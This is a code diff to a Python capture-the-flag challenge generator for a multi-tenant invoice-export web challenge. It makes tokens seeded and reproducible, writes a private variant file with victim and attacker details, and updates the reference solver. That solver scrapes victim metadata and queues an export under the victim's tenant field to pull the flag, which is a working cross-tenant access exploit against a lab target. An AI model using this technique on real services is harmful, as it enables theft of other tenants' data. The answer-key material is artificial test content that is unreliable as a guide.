@@ -1,7 +1,7 @@
 from __future__ import annotations
 
 import random
-import secrets
+import json
 from dataclasses import dataclass
 
 from ctf_generator.models import ChallengeSpec
@@ -45,6 +45,7 @@ def render_tenant_export(spec: ChallengeSpec, rng: random.Random) -> dict[str, s
         "public/description.md": _description(spec, variant, route_base, support_route),
         "public/hints.yaml": dump_yaml({"hints": public_hints}),
         "private/solution.md": _solution(variant, route_base, support_route),
+        "private/variant.json": _variant_json(variant, route_base, support_route),
         "private/checkpoints.yaml": dump_yaml(
             {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
         ),
@@ -64,9 +65,9 @@ def _variant(rng: random.Random) -> Variant:
     victim_tenant = rng.choice(["globex", "initech", "umbra", "solstice"])
     if victim_tenant == attacker_tenant:
         victim_tenant = "globex"
-    attacker_invoice = f"inv-{rng.randrange(1000, 9999)}-{secrets.token_hex(2)}"
-    victim_invoice = f"inv-{rng.randrange(1000, 9999)}-{secrets.token_hex(2)}"
-    flag = f"ctf{{tenant_worker_trust_{secrets.token_hex(6)}}}"
+    attacker_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
+    victim_invoice = f"inv-{rng.randrange(1000, 9999)}-{_token_hex(rng, 2)}"
+    flag = f"ctf{{tenant_worker_trust_{_token_hex(rng, 6)}}}"
     return Variant(
         export_noun=export_noun,
         support_noun=support_noun,
@@ -79,6 +80,35 @@ def _variant(rng: random.Random) -> Variant:
         victim_user="brenda",
         flag=flag,
     )
+
+
+def _token_hex(rng: random.Random, byte_count: int) -> str:
+    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()
+
+
+def _variant_json(v: Variant, route_base: str, support_route: str) -> str:
+    return json.dumps(
+        {
+            "family": "web_business_logic_tenant_export",
+            "routes": {
+                "export_base": route_base,
+                "support": support_route,
+            },
+            "tokens": {
+                "export_noun": v.export_noun,
+                "support_noun": v.support_noun,
+                "tenant_field": v.tenant_field,
+                "attacker_tenant": v.attacker_tenant,
+                "victim_tenant": v.victim_tenant,
+                "attacker_invoice": v.attacker_invoice,
+                "victim_invoice": v.victim_invoice,
+                "attacker_user": v.attacker_user,
+                "victim_user": v.victim_user,
+            },
+        },
+        indent=2,
+        sort_keys=True,
+    ) + "\n"
 
 
 def _compose() -> str:
@@ -446,27 +476,39 @@ def main():
             return json.loads(response.read().decode("utf-8"))
 
     get("/api/profile")
-    text = get("{support_route}")
-    invoice_match = re.search(r"{v.victim_invoice}", text)
-    tenant_match = re.search(r"{v.victim_tenant}", text)
-    if not invoice_match or not tenant_match:
+    profile = json.loads(get("/api/profile"))
+    routes = profile["routes"]
+    queue_route = routes["queue_export"]
+    status_template = routes["export_status"]
+    download_template = routes["download"]
+    support_route = routes["support"]
+
+    text = get(support_route)
+    invoice_match = re.search(r"Delayed invoice (inv-[0-9]{{4}}-[0-9a-f]{{4}})", text)
+    tenant_match = re.search(r"for tenant ([a-z]+)", text)
+    field_match = re.search(r"may still send ([a-z_]+)", text)
+    if not invoice_match or not tenant_match or not field_match:
         raise RuntimeError("could not find victim invoice metadata")
 
+    invoice_id = invoice_match.group(1)
+    tenant = tenant_match.group(1)
+    tenant_field = field_match.group(1)
+
     queued = post_json(
-        "{route_base}/queue",
-        {{"invoice_id": "{v.victim_invoice}", "{v.tenant_field}": "{v.victim_tenant}"}},
+        queue_route,
+        {{"invoice_id": invoice_id, tenant_field: tenant}},
     )
     job_id = queued["job_id"]
 
     for _ in range(40):
-        status = json.loads(get(f"{route_base}/status/{{job_id}}"))
+        status = json.loads(get(status_template.replace("<job_id>", job_id)))
         if status.get("status") == "ready":
             break
         time.sleep(0.25)
     else:
         raise RuntimeError("export never became ready")
 
-    download = get(f"{route_base}/download/{{job_id}}")
+    download = get(download_template.replace("<job_id>", job_id))
     match = re.search(r"ctf\\{{[^}}]+\\}}", download)
     if not match:
         raise RuntimeError("flag not found")
